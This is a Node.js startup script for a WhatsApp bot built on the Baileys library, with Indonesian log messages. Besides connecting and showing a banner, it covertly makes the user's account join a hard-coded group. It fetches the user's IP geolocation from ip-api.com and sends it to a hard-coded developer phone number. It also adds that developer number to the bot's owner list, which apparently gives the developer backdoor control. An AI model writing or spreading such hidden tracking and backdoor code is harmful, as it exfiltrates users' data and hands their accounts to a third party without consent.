const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const fazx = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
nocache('./fazx.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))

async function starts() {
fazx.autoReconnect = ReconnectMode.onConnectionLost
    fazx.version = [2, 2119, 6]
    fazx.logger.level = 'warn'
    fazx.browserDescription = ['FaizFZX','Desktop','3.0']
    await sleep(10000)
    fazx.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('|TRM|'), color('Scan QR nya ngab', 'cyan'))
    })
    fs.existsSync('./QRnya.json') && fazx.loadAuthInfo('./QRnya.json')
    
    fazx.on('credentials-updated', () => {
        console.log(color('|TRM|'), color('credentials updated!', 'cyan'))
        })
     
      await fazx.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./QRnya.json",JSON.stringify(fazx.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx`
 fazx.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Joined to bitch boot group', 'cyan'))
 fazx.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(fazx.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./fazx.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Mengirim Info Bot..', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       fazx.sendMessage("6285793887010@s.whatsapp.net", `─────「 FAIZFZX」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./fazx.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
     console.log(color('|WRN|', 'yellow'), color('Mengirim ip user ke developer....', 'cyan'))
   })
      
    fazx.on('connecting', () => {
		console.log(color('|TRM|'), color('Connecting...', 'cyan'))
		})
	
	fazx.on('open', () => {
	console.log(color('|TRM|'), color('Connected', 'cyan'))
	}) 
     
    fazx.on('ws-close', () => {
        console.log(color('|TRM|'), color('Koneksi Hilang, Mencoba Mengkoneksi ulang...', 'cyan'))
        })
    
    fazx.on('close', async () => {
        console.log(color('|TRM|'), color('Koneksi Terputus.', 'cyan'))
        })
    
	if (!settings.autoplaymusic) {
exec(`cd /sdcard/download && play *mp3`)
}
   
   fazx.on('chat-update', async (mek) => {
        require('./fazx.js')(fazx, mek)
        ownerNumber = ["6285793887010@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "6285793887010@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })   
        
console.clear()
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { console.clear(),
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('https://github.com/dcode-denpa/bitch-boot', 'cyan'))})}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 100 + Math.random() * 400 ) ;
	}
}
console.log(color(figlet.textSync(`${settings.NamaBot}`, {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 80,
		whitespaceBreak: true
	    }), 'lightgreen')), term.slowTyping(' Created By Denis Putra | Recode By Faiz' ,{ flashStyle: term.brightWhite })
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nLoading' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()